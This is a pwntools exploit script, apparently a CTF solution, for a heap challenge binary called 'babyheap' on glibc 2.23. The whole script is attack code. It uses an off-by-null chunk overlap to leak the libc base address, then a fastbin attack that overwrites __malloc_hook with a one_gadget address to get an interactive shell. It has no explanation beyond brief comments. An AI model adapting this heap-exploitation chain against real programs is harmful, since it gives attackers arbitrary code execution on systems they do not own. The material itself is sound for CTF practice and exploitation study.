from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./babyheap")
else:
	pass

def add(size,content):
	p.sendafter("choice: ","1")
	p.sendafter("size: ",str(size))
	p.sendlineafter("content: ",content)

def show(index):
	p.sendafter("choice: ","2")
	p.sendafter("index: ",str(index))

def free(index):
	p.sendafter("choice: ","3")
	p.sendafter("index: ",str(index))

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x1183)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()
#off by null attack
add(0x68,"a") #0
add(0x100,"\x00"*0xf0 + p64(0x100) + p64(0x71)) #1
add(0x80,"c") #2
add(0x80,"avoid top") #3
free(0)
free(1)
add(0x68,"c"*0x68) #0
add(0x80,"d") #1
add(0x60,"e") #4
free(1)
free(2)
add(0x80,"\x00") #1
show(4)
p.recvuntil("content: ")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))

#fastbin attack
free(1)
add(0x90,"\x00"*0x80 + p64(0x0) + p64(0x71))
free(4)
free(1)
payload = "\x00"*0x80 + p64(0) + p64(0x71) + p64(libc.symbols["__malloc_hook"] - 0x23)
add(0x100,payload)
add(0x68,"a1")
one_gadget = libc.address + 0x4526a
add(0x68,"aaa" + p64(0)*2 + p64(one_gadget))
p.sendafter("choice: ","1")
p.sendafter("size: ",str(0x10))
p.interactive()
